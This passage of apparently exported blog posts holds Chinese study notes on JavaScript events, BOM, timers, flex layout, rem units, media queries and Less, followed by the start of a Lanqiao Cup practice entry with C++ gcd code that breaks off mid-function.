<p>-<br>当我们注册事件时，event对象就会被系统自动创建，并依次传递给事件监听器（事件处理函数）</p>
<h6 id="属性和方法"><a href="#属性和方法" class="headerlink" title="属性和方法"></a>属性和方法</h6><table>
<thead>
<tr>
<th>事件对象属性方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>e.target</td>
<td>返回触发事件的对象                标准</td>
</tr>
<tr>
<td>e.srcElement</td>
<td>返回触发事件的对象                 非标准</td>
</tr>
<tr>
<td>e.type</td>
<td>返回事件的类型       比如click  mouseover  不带on</td>
</tr>
<tr>
<td>e.cancelBubble</td>
<td>该属性阻止冒泡        非标准</td>
</tr>
<tr>
<td>e.returnValue</td>
<td>该属性阻止默认事件（默认行为）     非标准     return后面的代码不执行</td>
</tr>
<tr>
<td>e.preventDefault</td>
<td>该方法阻止默认事件（默认行为）      标准</td>
</tr>
<tr>
<td>e.stopPropagation</td>
<td>阻止冒泡    标准</td>
</tr>
</tbody></table>
<h6 id="this和e-target的区别"><a href="#this和e-target的区别" class="headerlink" title="this和e.target的区别"></a>this和e.target的区别</h6><ul>
<li>e.target 返回的是触发事件的对象（事件） 点击哪个元素就返回哪个元素</li>
<li>this 返回的是绑定事件的对象（元素）  返回this绑定的点击事件</li>
</ul>
<h6 id="事件委托"><a href="#事件委托" class="headerlink" title="事件委托"></a>事件委托</h6><ul>
<li>原理：不是每个子节点单独设置事件监听器，而是事件监听器设置在其父节点上，然后利用冒泡原理影响设置每个子节点</li>
</ul>
<h6 id="鼠标事件对象"><a href="#鼠标事件对象" class="headerlink" title="鼠标事件对象"></a>鼠标事件对象</h6><table>
<thead>
<tr>
<th>鼠标事件对象</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>e.clientX</td>
<td>返回鼠标相对于浏览器窗口可视区的X坐标</td>
</tr>
<tr>
<td>e.clientY</td>
<td>返回鼠标相对于浏览器窗口可视区的Y坐标</td>
</tr>
<tr>
<td>e.pageX</td>
<td>返回鼠标相对于文档页面的X坐标</td>
</tr>
<tr>
<td>e.pageY</td>
<td>返回鼠标相对于文档页面的Y坐标</td>
</tr>
<tr>
<td>e.screenX</td>
<td>返回鼠标相对于电脑屏幕的X坐标</td>
</tr>
<tr>
<td>e.screenY</td>
<td>返回鼠标相对于电脑屏幕的Y坐标</td>
</tr>
</tbody></table>
<h6 id="常用的键盘事件"><a href="#常用的键盘事件" class="headerlink" title="常用的键盘事件"></a>常用的键盘事件</h6><table>
<thead>
<tr>
<th>键盘事件</th>
<th>触发条件</th>
</tr>
</thead>
<tbody><tr>
<td>onkeyup</td>
<td>某个键盘按键被松开时触发（字不会输入进去）</td>
</tr>
<tr>
<td>onkeydown</td>
<td>某个键盘按键被按下时触发（可能会输出字）</td>
</tr>
<tr>
<td>onkeypress</td>
<td>某个键盘按键被按下时触发，但是他不识别功能键，比如 CTRL shift 箭头等</td>
</tr>
<tr>
<td>keyCode</td>
<td>返回改键的ASCII值</td>
</tr>
</tbody></table>
<ul>
<li>如果使用addEventListener 不需要加 on</li>
<li>三个事件的执行顺序是 keydown-keypress-keyup</li>
<li>onkeydown 和 onkeyup 不区分大小写，onkeypress 区分字母大小写</li>
</ul>
<h6 id="键盘事件对象"><a href="#键盘事件对象" class="headerlink" title="键盘事件对象"></a>键盘事件对象</h6><ul>
<li><code>document.querySelector()</code></li>
</ul>
<h4 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h4><ul>
<li>浏览器对象模型，提供了独立于内容而与浏览器窗口进行交互的对象。核心对象是window</li>
<li>它是JS访问浏览器窗口的一个接口</li>
<li>它是一个全局变量，定义在全局范围内，函数都会变成window对象的属性和方法</li>
</ul>
<h5 id="页面加载事件"><a href="#页面加载事件" class="headerlink" title="页面加载事件"></a>页面加载事件</h5><p>-<br>window.onload  是窗口（页面）加载事件，当文档内容完全加载完成后触发该事件（包括图像、脚本文件、CSS文件等）就调用的处理函数</p>
<p>-<br>语法：<code>window.onload=function()&#123;&#125;</code>或者<code>window.addEventListener(&quot;load&quot;,function()&#123;&#125;)</code>;</p>
<p>-<br>  注意：</p>
<ul>
<li>有了window.onload 就可以把JS代码写到元素页面上方，因为onload是等页面内容全部加载完毕，再去执行处理函数</li>
<li>window.onload 传统注册事件方式只能写一次，如果有多个，会以最后一个window.onload为准</li>
<li>如果使用addEventListener则没有限制</li>
<li>DOMContentLoaded 是DOM加载完毕，不包含图片，falsh , CSS 等就可以执行，加载速度比load更快一些</li>
</ul>
<h5 id="调整窗口大小事件"><a href="#调整窗口大小事件" class="headerlink" title="调整窗口大小事件"></a>调整窗口大小事件</h5><ul>
<li><p>调整窗口大小事件 <code>window.onresize</code> 触发就调用</p>
<ul>
<li><p>语法：</p>
<ul>
<li><code>window.onresize=function=function()&#123;&#125;</code> 或者<code>window.addEventListener(&quot;resize&quot;,function()&#123;&#125;);</code></li>
</ul>
</li>
</ul>
</li>
</ul>
<h5 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h5><ul>
<li><p>语法：</p>
<ul>
<li><code>window.setTimeout(调用函数，[延迟的毫秒数])</code></li>
</ul>
</li>
<li><p>注意：</p>
<ul>
<li>这个window可以省略</li>
<li>这个调用函数可以直接写函数，或者写函数名或者采用字符串  ‘ 函数名’三种形式 ，第三种不推荐</li>
<li>延迟的毫秒数省略默认是0，如果写，必须是毫秒</li>
<li>定时器很多，经常给定时器赋值一个标识符</li>
<li>回调函数，上一件事干完，再回头调用这个函数</li>
</ul>
</li>
</ul>
<h6 id="停止计时器"><a href="#停止计时器" class="headerlink" title="停止计时器"></a>停止计时器</h6><ul>
<li><p>语法：</p>
<ul>
<li><code>window.clearTimeout(timeout ID)</code></li>
</ul>
</li>
<li><p>取消了先前通过调用setTimeout()建立的定时器</p>
</li>
<li><p>里面的参数就是定时器的标识符</p>
</li>
</ul>
<h6 id="setInterval-定时器"><a href="#setInterval-定时器" class="headerlink" title="setInterval() 定时器"></a>setInterval() 定时器</h6><ul>
<li><p>语法：</p>
<ul>
<li><code>windows.setInterval(回调函数，[间隔的毫秒数])</code>；</li>
<li>重复调用一个函数，每隔这个时间，就去调用一次回调函数</li>
<li>间隔的毫秒数省略默认是0，如果写，必须是毫秒，表示每隔多少毫秒就自动调用这个函数</li>
<li>需要给定时器赋值标识符</li>
</ul>
</li>
</ul>
<h6 id="停止setInterval-定时器"><a href="#停止setInterval-定时器" class="headerlink" title="停止setInterval()定时器"></a>停止setInterval()定时器</h6><ul>
<li><p>语法：</p>
<ul>
<li><code>window.clearInterval(interVallID)</code>；</li>
<li>取消了先前通过调用setInterval 建立的定时器</li>
<li>里面的参数就是定时器的标识符</li>
</ul>
</li>
</ul>
<h6 id="this的指向问题"><a href="#this的指向问题" class="headerlink" title="this的指向问题"></a>this的指向问题</h6><ul>
<li>全局作用域或者普通函数中this 指向全局对象window （注意定时器里面的this 指向window）</li>
<li>方法调用中谁调用this指向谁</li>
<li>构造函数中this指向的是fun实例对象</li>
</ul>
<h4 id="JS的执行机制"><a href="#JS的执行机制" class="headerlink" title="JS的执行机制"></a>JS的执行机制</h4><h5 id="同步和异步"><a href="#同步和异步" class="headerlink" title="同步和异步"></a>同步和异步</h5><h6 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h6><ul>
<li><p>前一个任务结束后再执行后一个任务，程序的执行顺序与任务的排列顺序是一致的、同步的</p>
</li>
<li><p>同步任务：</p>
<ul>
<li>同步任务都在主线程上执行，形成一个执行栈</li>
</ul>
</li>
</ul>
<h6 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h6><p>-<br>做这件事的同时，可以去做其他事</p>
<p>-<br>  异步任务：</p>
<ul>
<li><p>是通过回调函数实现</p>
</li>
<li><p>类型：</p>
<ul>
<li>普通事件 ， click  ，resize</li>
<li>资源加载， load ，error</li>
<li>定时器：setinterval 、 setTimeout</li>
<li>异步任务相关的回调函数添加到任务队列（有时候也称消息队列）</li>
</ul>
</li>
</ul>
<h6 id="执行过程"><a href="#执行过程" class="headerlink" title="执行过程"></a>执行过程</h6><ul>
<li>先执行执行栈中的同步任务</li>
<li>异步任务（回调函数）放入任务队列中</li>
<li>一旦执行栈中的所有同步任务执行完毕，系统就会按照次序读取任务队列中的异步任务，于是被读取的异步任务结束等待状态，进入执行栈开始执行</li>
</ul>
<h4 id="PC端网页特效"><a href="#PC端网页特效" class="headerlink" title="PC端网页特效"></a>PC端网页特效</h4><h5 id="元素偏移量offset-系列"><a href="#元素偏移量offset-系列" class="headerlink" title="元素偏移量offset 系列"></a>元素偏移量offset 系列</h5><ul>
<li><p>使用offset 可以得到该元素的位置（偏移）、大小等</p>
</li>
<li><p>获得元素距离带有定位父元素的位置</p>
</li>
<li><p>获得元素自身的大小（宽度和高度）</p>
</li>
<li><p>注意返回的数值都不带单位</p>
<table>
<thead>
<tr>
<th>offset 系列属性</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>element.offsetParent</td>
<td>返回作为该元素带有定位的父级元素，如果父级都没有定位则返回body</td>
</tr>
<tr>
<td>element.offsetTop</td>
<td>返回元素相对带有定位父元素上方的偏移</td>
</tr>
<tr>
<td>element.offsetLeft</td>
<td>返回元素相对带有定位父元素左边框的偏移</td>
</tr>
<tr>
<td>element.offsetWidth</td>
<td>返回自身包括padding 、边框、内容区的宽度、返回数值不带单位</td>
</tr>
<tr>
<td>element.offsetHeight</td>
<td>返回自身包括padding 、边框、内容区的度高、返回数值不带单位</td>
</tr>
</tbody></table>
</li>
<li><p>注意：</p>
<ul>
<li>想要获取元素大小位置，用offset 更合适</li>
<li>想要给元素更改值，需要用style改变</li>
</ul>
</li>
</ul>
<h5 id="元素可视区client系列"><a href="#元素可视区client系列" class="headerlink" title="元素可视区client系列"></a>元素可视区client系列</h5><ul>
<li>可通过client得到该元素的边框大小、元素大小等<table>
<thead>
<tr>
<th>client系列属性</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>element.clientTop</td>
<td>返回元素上边框的 大小</td>
</tr>
<tr>
<td>element.clientLeft</td>
<td>返回元素左边框的大小</td>
</tr>
<tr>
<td>element.clientWidth</td>
<td>返回自身包括padding、内容区的宽度、不含边框、返回数值不带单位</td>
</tr>
<tr>
<td>element.clientHeight</td>
<td>返回自身包括padding、内容区的高度、不含边框、返回数值不带单位</td>
</tr>
</tbody></table>
</li>
</ul>
<h5 id="立即执行函数"><a href="#立即执行函数" class="headerlink" title="立即执行函数"></a>立即执行函数</h5><p>-<br>不需要调用，立马能够自己执行的函数</p>
<p>-<br>  写法：</p>
<ul>
<li><code>(function()&#123;&#125;)() or (function()&#123;&#125;())</code></li>
<li>立即执行函数最大的作用就是独立创建了一个作用域，里面所有的变量都是局部变量，不会有命名冲突的情况</li>
</ul>
<h5 id="元素滚动scroll系列"><a href="#元素滚动scroll系列" class="headerlink" title="元素滚动scroll系列"></a>元素滚动scroll系列</h5><ul>
<li><p>使用scroll得到该元素的大小、滚动距离等</p>
<table>
<thead>
<tr>
<th>scroll系列属性</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>element.scrollTop</td>
<td>返回被卷去的上侧的距离，返回数值不带单位</td>
</tr>
<tr>
<td>element.scrollLeft</td>
<td>返回被卷去的左侧的距离，返回数值不带单位</td>
</tr>
<tr>
<td>element.scrollWidth</td>
<td>返回自身实际的宽度，不含边框，返回数值不带单位</td>
</tr>
<tr>
<td>element.scrollHeight</td>
<td>返回自身实际的高度，不含边框，返回数值不带单位</td>
</tr>
</tbody></table>
</li>
<li><p>页面被卷去的头部：可以通过windows.pageYOffset获得  ，如果是被卷去的左侧window.pageXOffset</p>
</li>
<li><p>注意元素被卷去的头部是element.scrollTop ,如果是页面被卷去的头部则是windows.pageTOffset</p>
</li>
</ul>
<h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><ul>
<li>offset系列经常用于获得元素位置</li>
<li>client经常用于获取元素大小</li>
<li>scroll经常用于获取滚动距离</li>
<li>注意页面滚动距离是通过windows.pageYOffset 获得</li>
</ul>
<h5 id="mouseenter-和-mouseover-的区别"><a href="#mouseenter-和-mouseover-的区别" class="headerlink" title="mouseenter 和 mouseover  的区别"></a>mouseenter 和 mouseover  的区别</h5><ul>
<li>当鼠标移动到元素上时就会触发mouseenter事件</li>
<li>类似mouseover ，他们两者之间的差别是 mouseover 鼠标经过自身盒子会触发，经过子盒子还会触发，mouseenter 只会经过自身盒子触发</li>
<li>是因为mouseenter不会冒泡</li>
<li>跟mouseenter 搭配 鼠标离开 mouseleave同样不会冒泡</li>
</ul>
<h5 id="动画函数封装"><a href="#动画函数封装" class="headerlink" title="动画函数封装"></a>动画函数封装</h5><ul>
<li><p>核心原理：通过定时器 setInterval() 不断移动盒子位置</p>
</li>
<li><p>实现步骤：</p>
<ul>
<li>获得盒子当前位置</li>
<li>让盒子在当前位置加上1个移动距离</li>
<li>利用定时器不断重复这个操作</li>
<li>加一个结束定时器的条件</li>
<li>注意此元素需要添加定位，才能使用element.style.left</li>
</ul>
</li>
</ul>
<h6 id="简单动画函数封装"><a href="#简单动画函数封装" class="headerlink" title="简单动画函数封装"></a>简单动画函数封装</h6><ul>
<li><code>function animate(obj,target)&#123;&#125;</code></li>
<li>简单动画函数封装obj目标对象 target 目标位置</li>
</ul>
<h6 id="缓动效果原理"><a href="#缓动效果原理" class="headerlink" title="缓动效果原理"></a>缓动效果原理</h6><ul>
<li><p>思路：</p>
<ul>
<li>让盒子每次移动的距离慢慢变小，速度就会就会慢慢停下来</li>
<li>核心算法 : (目标值-现在的位置) &#x2F; 10 作为每次移动的距离步长</li>
<li>停止的条件：让当前盒子位置等于目标位置就停止定时器</li>
</ul>
</li>
</ul>
<h6 id="动画函数添加回调函数"><a href="#动画函数添加回调函数" class="headerlink" title="动画函数添加回调函数"></a>动画函数添加回调函数</h6><ul>
<li>函数可以执行一个参数，将这个函数作为参数传到另一个函数里面，当那个函数执行完以后，再执行传进去的这个函数，这个过程叫做回调</li>
</ul>
<h6 id="节流阀"><a href="#节流阀" class="headerlink" title="节流阀"></a>节流阀</h6><ul>
<li><p>防止轮播图按钮连续点击造成播放过快</p>
</li>
<li><p>节流阀目的：</p>
<ul>
<li>当上一个函数动画内容执行完毕，再去执行下一个函数动画，让事件无法触发</li>
</ul>
</li>
<li><p>实现思路</p>
<ul>
<li>利用回调函数，添加一个变量来控制，锁住函数和解锁函数</li>
</ul>
</li>
</ul>
<h6 id="返回页面的某一位置"><a href="#返回页面的某一位置" class="headerlink" title="返回页面的某一位置"></a>返回页面的某一位置</h6><ul>
<li><p>语法：</p>
<ul>
<li><code>window.scroll(x,y)</code></li>
<li>x,y不跟单位，直接写数字即可</li>
</ul>
</li>
</ul>
<h3 id="移动端网页特效"><a href="#移动端网页特效" class="headerlink" title="移动端网页特效"></a>移动端网页特效</h3><h4 id="触屏事件"><a href="#触屏事件" class="headerlink" title="触屏事件"></a>触屏事件</h4><ul>
<li>不用考虑兼容性问题</li>
</ul>
<h5 id="常见的触屏事件"><a href="#常见的触屏事件" class="headerlink" title="常见的触屏事件"></a>常见的触屏事件</h5><table>
<thead>
<tr>
<th>触屏touch 事件</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>touchstart</td>
<td>手指触摸到一个DOM元素时触发</td>
</tr>
<tr>
<td>touchmove</td>
<td>手指在一个DOM元素上滑动时触发</td>
</tr>
<tr>
<td>touchend</td>
<td>手指从一个DOM元素上移开时触发</td>
</tr>
</tbody></table>
<h5 id="触摸事件对象"><a href="#触摸事件对象" class="headerlink" title="触摸事件对象"></a>触摸事件对象</h5><ul>
<li><p>平时都是给元素注册触摸事件，重点记住 targetTouches .</p>
<table>
<thead>
<tr>
<th>触摸列表</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>touches</td>
<td>正在触摸屏幕的所有手指的一个列表</td>
</tr>
<tr>
<td>targetTouches</td>
<td>正在触摸当前DOM元素上的手指的一个列表</td>
</tr>
<tr>
<td>changeTouches</td>
<td>手指状态发生了改变的列表，从无到有，从有到无变化</td>
</tr>
</tbody></table>
</li>
<li><p>前两个如果侦听的是一个DOM元素，则它们两个是一样的</p>
</li>
<li><p>当我们的手指离开屏幕的时候，就没有了touches和targetTouches列表，但是会有changedTouches</p>
</li>
</ul>
<h4 id="拖动元素"><a href="#拖动元素" class="headerlink" title="拖动元素"></a>拖动元素</h4><h5 id="拖动元素三部曲"><a href="#拖动元素三部曲" class="headerlink" title="拖动元素三部曲"></a>拖动元素三部曲</h5><ul>
<li><p>触摸元素 touchstart：获取手指初始坐标，同时获得盒子原来的坐标</p>
</li>
<li><p>移动元素 touchmove: 计算手指的滑动距离，并且移动盒子</p>
</li>
<li><p>离开手指touchend</p>
</li>
<li><p>注意：</p>
<ul>
<li>手指移动也会触发滚动屏幕所以这里要阻止默认的屏幕滚动e.preventDefault();</li>
</ul>
</li>
</ul>
<h2 id="移动web开发"><a href="#移动web开发" class="headerlink" title="移动web开发"></a>移动web开发</h2><h3 id="视口"><a href="#视口" class="headerlink" title="视口"></a>视口</h3><ul>
<li>布局视口、视觉视口、理想视口</li>
</ul>
<h4 id="Meta视口标签"><a href="#Meta视口标签" class="headerlink" title="Meta视口标签"></a>Meta视口标签</h4><p>-<br>语法： <code>&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0，user-scalable-no,maximum-scale=1.0，minimum-scale=1.0&quot;</code></p>
<table>
<thead>
<tr>
<th>属性</th>
<th>解释说明</th>
</tr>
</thead>
<tbody><tr>
<td>width</td>
<td>宽度设置的是 viewport ,可以设置为device-width特殊值</td>
</tr>
<tr>
<td>initial-scale</td>
<td>初始缩放比，大于0的数</td>
</tr>
<tr>
<td>maximum-scale</td>
<td>最大缩放比</td>
</tr>
<tr>
<td>minimum-scale&#x3D;1.0</td>
<td>最小缩放比</td>
</tr>
<tr>
<td>user-scalable</td>
<td>用户是否可以缩放 （1&#x2F;0）（yes or no）</td>
</tr>
</tbody></table>
<h4 id="二倍图"><a href="#二倍图" class="headerlink" title="二倍图"></a>二倍图</h4><h5 id="物理像素与物理像素比"><a href="#物理像素与物理像素比" class="headerlink" title="物理像素与物理像素比"></a>物理像素与物理像素比</h5><ul>
<li>物理像素点：屏幕显示的最小颗粒，分辨率</li>
<li>1px不是一定等于1个物理像素的</li>
<li>物理像素比：一个px能显示的物理像素点的个数（也称屏幕像素比）</li>
</ul>
<h5 id="二倍图的解决方法"><a href="#二倍图的解决方法" class="headerlink" title="二倍图的解决方法"></a>二倍图的解决方法</h5><p>-<br>（直接将图片放到手机会放大倍数，进而变得模糊）</p>
<p>-<br>将图片手动缩小为以前的一半或者其他倍数，实际需要的时候会放大</p>
<h5 id="二倍精灵图的做法"><a href="#二倍精灵图的做法" class="headerlink" title="二倍精灵图的做法"></a>二倍精灵图的做法</h5><ul>
<li>在firework里面把精灵图等比例缩放为原来的一半</li>
<li>之后根据大小测量坐标</li>
<li>注意代码里面background-size也要写：精灵图原来宽度的一半</li>
</ul>
<h5 id="背景缩放"><a href="#背景缩放" class="headerlink" title="背景缩放"></a>背景缩放</h5><p>-<br>语法： <code>background-size:背景图片高度 背景图片宽度</code></p>
<p>-<br>只写一个参数就是宽度，高度等比缩放</p>
<p>-<br>cover:等比例拉伸  要完全覆盖盒子，可能会有部分背景图片显示不全</p>
<p>-<br>contain  高度和宽度等比例拉伸 当宽度或者高度铺满盒子就不再进行拉伸    可能有部分空白区域</p>
<p>-<br>特殊样式</p>
<h3 id="常见布局"><a href="#常见布局" class="headerlink" title="常见布局"></a>常见布局</h3><h4 id="流式布局"><a href="#流式布局" class="headerlink" title="流式布局"></a>流式布局</h4><p>-<br>百分比布局，也叫非固定像素布局</p>
<p>-<br>通过盒子的宽度设置为百分比来根据屏幕的宽度进行伸缩，内容向两侧移动</p>
<p>-<br>max-width 最大宽度（max-height最大高度）</p>
<p>-<br>min-width 最大宽度（min-height最大高度）</p>
<h4 id="flex-布局"><a href="#flex-布局" class="headerlink" title="flex 布局"></a>flex 布局</h4><ul>
<li>弹性布局，为盒状模型提供最大的灵活性</li>
<li>当我们为父盒子设为flex布局以后，子元素的float，clear，vertical-align属性将失效</li>
<li>通过给父盒子添加flex属性，来控制子盒子的位置和排列方式</li>
</ul>
<h5 id="父项属性"><a href="#父项属性" class="headerlink" title="父项属性"></a>父项属性</h5><h6 id="flex-direction-设置主轴的方向"><a href="#flex-direction-设置主轴的方向" class="headerlink" title="flex-direction 设置主轴的方向"></a>flex-direction 设置主轴的方向</h6><p>-<br>我们的元素是跟着主轴排列的</p>
<p>-<br>row 默认值从左至右</p>
<p>-<br>row-reverse 从右至左</p>
<p>-<br>column从上到下</p>
<p>-<br>column-reverse从下到上</p>
<p>-<br>flex-direction : column; 此时主轴设置为y轴，x 为侧轴</p>
<h6 id="justify-content-设置主轴上的子元素排列方式"><a href="#justify-content-设置主轴上的子元素排列方式" class="headerlink" title="justify-content 设置主轴上的子元素排列方式"></a>justify-content 设置主轴上的子元素排列方式</h6><ul>
<li>定义了项目在主轴上的对齐方式，使用之前确定好主轴是哪个</li>
<li>flex-start默认值从头部开始 如果主轴是x轴，则从左到右</li>
<li>flex-end从尾部开始排列</li>
<li>center 从主轴居中对齐（如果主轴是x轴，则水平居中）</li>
<li>space-around 平分剩余空间</li>
<li>space-between先两边贴边 再平分剩余空间！！！</li>
</ul>
<h6 id="flex-wrap-子元素是否换行"><a href="#flex-wrap-子元素是否换行" class="headerlink" title="flex-wrap 子元素是否换行"></a>flex-wrap 子元素是否换行</h6><ul>
<li>nowrap 默认值不换行</li>
<li>wrap 换行</li>
</ul>
<h6 id="align-items-设置侧轴子元素排列-单行"><a href="#align-items-设置侧轴子元素排列-单行" class="headerlink" title="align-items  设置侧轴子元素排列(单行)"></a>align-items  设置侧轴子元素排列(单行)</h6><ul>
<li>flex-start  从上到下</li>
<li>flex-end   从下到上</li>
<li>center 挤在一起居中（垂直居中）</li>
<li>stretch 拉伸</li>
</ul>
<h6 id="align-content-设置侧轴子元素排列-多行"><a href="#align-content-设置侧轴子元素排列-多行" class="headerlink" title="align-content 设置侧轴子元素排列(多行)"></a>align-content 设置侧轴子元素排列(多行)</h6><ul>
<li>align-items 适用于单行的情况下，只有上对齐，下对齐，居中和拉伸</li>
<li>align-content 适用于换行的情况下，单行情况下无效，可以设置上对齐，下对齐，居中，拉伸已经平均分配剩余空间等属性值</li>
<li>space-around      子项在侧轴平分剩余空间</li>
<li>space-between    子项在侧轴先分布在两头，再平分剩余空间</li>
</ul>
<h6 id="简写"><a href="#简写" class="headerlink" title="简写"></a>简写</h6><ul>
<li>flex-flow : row wrap:  主轴 和换行 同时设置</li>
</ul>
<h5 id="子项常见属性"><a href="#子项常见属性" class="headerlink" title="子项常见属性"></a>子项常见属性</h5><h6 id="flex属性"><a href="#flex属性" class="headerlink" title="flex属性"></a>flex属性</h6><ul>
<li>语法：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.item&#123;</span><br><span class="line">	flex:&lt;number&gt;; /*default 0*/</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>定义子项目分配剩余空间，用flex来表示剩余份数</li>
</ul>
<h6 id="align-self-属性"><a href="#align-self-属性" class="headerlink" title="align-self 属性"></a>align-self 属性</h6><p>-<br>控制某一个子项自己在侧轴上的排列方式改变</p>
<p>-<br>语法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">span:nth-child(2)&#123;</span><br><span class="line">	/*设置自己在侧轴上的排列顺序*/</span><br><span class="line">	align-self:flex-end</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="order-属性"><a href="#order-属性" class="headerlink" title="order 属性"></a>order 属性</h6><ul>
<li>定义项目的排列顺序</li>
<li>数值越小，排列越靠前，默认为0</li>
<li>注意和Z-index不一样</li>
</ul>
<h4 id="rem适配布局"><a href="#rem适配布局" class="headerlink" title="rem适配布局"></a>rem适配布局</h4><h5 id="rem-单位"><a href="#rem-单位" class="headerlink" title="rem 单位"></a>rem 单位</h5><p>-<br>em相对于父元素的字体大下来说的</p>
<p>-<br>rem的基准是相对于html元素的字体大小</p>
<p>-<br>优势可以通过修改html里面的文字大小来改变页面中元素的大小可以整体控制</p>
<h5 id="方案1"><a href="#方案1" class="headerlink" title="方案1"></a>方案1</h5><h6 id="元素大小取值方法"><a href="#元素大小取值方法" class="headerlink" title="元素大小取值方法"></a>元素大小取值方法</h6><ul>
<li>最后的公式：页面元素的rem值&#x3D;页面元素值（px)&#x2F;(屏幕宽度&#x2F;屏幕份数)</li>
<li>屏幕宽度&#x2F;划分的份数就是页面html font-size 的大小</li>
<li>或者：元素页面的rem值&#x3D;元素页面值（px)&#x2F;html  font-size 字体大小</li>
</ul>
<h5 id="方案二"><a href="#方案二" class="headerlink" title="方案二"></a>方案二</h5><h6 id="flexible-js"><a href="#flexible-js" class="headerlink" title="flexible.js"></a>flexible.js</h6><h5 id="swiper-基本使用"><a href="#swiper-基本使用" class="headerlink" title="swiper 基本使用"></a>swiper 基本使用</h5><ul>
<li>滑动效果等</li>
</ul>
<h5 id="媒体查询（Media-Query）"><a href="#媒体查询（Media-Query）" class="headerlink" title="媒体查询（Media Query）"></a>媒体查询（Media Query）</h5><ul>
<li>@media可以针对不同屏幕尺寸设置不同的样式</li>
<li>语法：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ media mediatype and|not|only(media feature)&#123;</span><br><span class="line">	CSS-Code;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><a href="/media">@media </a> 注意@符号 </li>
<li>mediatype 媒体类型</li>
<li>关键字 and not only</li>
<li>(media feature)媒体特性，必须有小括号包含</li>
</ul>
<h6 id="媒体类型"><a href="#媒体类型" class="headerlink" title="媒体类型"></a>媒体类型</h6><ul>
<li>all用于所有设备</li>
<li>print用于打印机和打印预览</li>
<li>screen用于电脑屏幕，平板电脑，智能手机等</li>
</ul>
<h6 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h6><ul>
<li>and将多个媒体特性连接到一起，且的意思</li>
<li>not:排除某个媒体类型，相当于 非</li>
<li>only：指定特定设备</li>
</ul>
<h6 id="媒体特性"><a href="#媒体特性" class="headerlink" title="媒体特性"></a>媒体特性</h6><p>-<br>width 定义输出设备中页面可见区域的宽度</p>
<p>-<br>min-width 定义输出设备中页面最小可见区域宽度</p>
<p>-<br>max-width定义输出设备中页面最大可见区域宽度</p>
<p>-<br>为了防止混乱，代码从小到大进行（重叠性作用）</p>
<p>-<br>screen 还有 and 必须带上，不能省略，必须跟单位</p>
<h6 id="媒体查询引入资源"><a href="#媒体查询引入资源" class="headerlink" title="媒体查询引入资源"></a>媒体查询引入资源</h6><p>-<br>定义：针对不同的媒体使用不同的stylesheets(样式表) ，在link中判断设备的尺寸，然后引用的不同的css文件</p>
<pre><code>        引入资源就是针对不同的屏幕尺寸  调用不同的css文件
</code></pre>
<p>-<br>语法：</p>
<p><code>&lt;link rel=&quot;stylesheet&quot; media =&quot;mediatype and not||only(media feature)&quot;href=&quot;mystylesheet.css&quot;</code></p>
<h2 id="Less预处理语言"><a href="#Less预处理语言" class="headerlink" title="Less预处理语言"></a>Less预处理语言</h2><ul>
<li>CSS扩展语言，预处理器</li>
</ul>
<h3 id="Less变量"><a href="#Less变量" class="headerlink" title="Less变量"></a>Less变量</h3><ul>
<li>语法： <code>@ 变量名：值；</code></li>
</ul>
<h3 id="Less嵌套"><a href="#Less嵌套" class="headerlink" title="Less嵌套"></a>Less嵌套</h3><p>-<br>样式直接写在父元素就好</p>
<p>-<br>  如果有（交集|伪类|伪元素选择器）</p>
<ul>
<li>内层选择器的前面没有&amp;符号，则它被解析为父选择器的后代</li>
<li>如果有&amp;符号，它就被解析为父元素自身或者父元素的伪类</li>
</ul>
<h3 id="Less的运算"><a href="#Less的运算" class="headerlink" title="Less的运算"></a>Less的运算</h3><ul>
<li>运算符的左右两侧必须敲一个空格隔开</li>
<li>两个数参与运算	如果只有一个数有单位，则最后的结果就以这个单位为准</li>
<li>两个数参与运算，如果两个数都有单位，而且单位不一样，最后的结果以第一个值为主</li>
</ul>
]]></content>
      <categories>
        <category>编程技能</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>css</tag>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝桥杯练习笔记</title>
    <url>/2023/03/01/%E7%BC%96%E7%A8%8B%E6%8A%80%E8%83%BD/%E8%93%9D%E6%A1%A5%E6%9D%AF%E7%BB%83%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="辗转相除法"><a href="#辗转相除法" class="headerlink" title="辗转相除法"></a>辗转相除法</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun1</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span>? a: <span class="built_in">fun1</span>(b, a % b);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 迭代法</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">fun2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (b) &#123;</span><br><span class="line">        